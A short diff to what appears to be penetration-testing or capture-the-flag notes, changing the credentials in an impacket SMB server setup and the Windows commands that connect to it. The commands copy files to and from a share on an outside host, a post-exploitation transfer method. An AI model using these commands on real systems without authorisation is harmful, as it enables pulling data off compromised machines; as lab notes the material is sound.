@@ -88,8 +88,8 @@ Windows Message:
 Do this:
 
 ```bash
-impacket-smbserver -username gareth -password gareth share . -smb2support
-net use \\10.10.16.9\share /u:gareth gareth
+impacket-smbserver -username garffff -password garffff share . -smb2support
+net use \\10.10.16.9\share /u:garffff garffff
 copy \\10.10.16.9\share\<file wanted>
 copy <file wanted> \\10.10.16.9\share
 ```
